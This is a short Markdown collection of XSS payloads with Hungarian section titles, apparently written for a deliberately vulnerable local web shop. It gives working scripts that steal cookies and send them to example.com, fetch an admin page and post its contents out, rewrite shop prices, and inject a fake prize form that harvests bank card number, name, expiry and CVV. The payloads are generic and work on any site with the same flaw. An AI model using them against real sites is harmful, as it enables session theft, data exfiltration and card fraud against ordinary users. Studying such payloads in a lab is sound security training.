# XSS Payloads

## Alert

```
<script>
    alert(1)
</script>
```

## Redirect

```
<script>
    window.location='https://www.youtube.com/c/WebManiacc'
</script>
```

## Cookie lopás

```
<script>
    fetch(`https://example.com?cookie=${encodeURIComponent(document.cookie)}`)
</script>
```

## Védett oldalhoz való hozzáférés

```
<script>
fetch('http://localhost/~rrd/vulnerable_shop/?admin')
    .then(p => p.text())
    .then(t => fetch('https://example.com', {method: 'POST', body: JSON.stringify({t})}))
</script>
```

## Árak módosítása

```
<script>
fetch('http://localhost/~rrd/vulnerable_shop')
    .then(p => p.text())
    .then(t => document.body.innerHTML = t.replace(/<h3>(.*)<\/h3>/g, '<h3>1 Ft</h3>'))
</script>
```

## Hamis akció hirdetése

```
<script>
fetch('http://localhost/~rrd/vulnerable_shop')
    .then(p => p.text())
    .then(t => document.body.innerHTML = t.replace(
        '<main class="g3">',
        '<main class="g3">
            <section class="product">
            <h2>
                <span>Nyereményjáték</span>
            </h2>
            <p>Ebben a hónapban minden 100-adik vásárlónk nyer egy 100.000 Ft-os összeget, amit közvetlenül a bankkártyádra teszünk!</p>
            <h3>Nyertél!</h3>
            <h3>Te vagy a 300-adik vásárlónk!</h3>
            <form action="https://example.com" method="POST">
            <p>
                <input type="text" placeholder="bankkártya szám">
                <input type="text" placeholder="név">
                <input type="text" placeholder="lejárati idő">
                <input type="text" placeholder="CCV">
            </p>
            <p>
                <button class="addToCart">Kérem a nyereményt</button>
            </p>
            </form>
        </section>'))
</script>
```
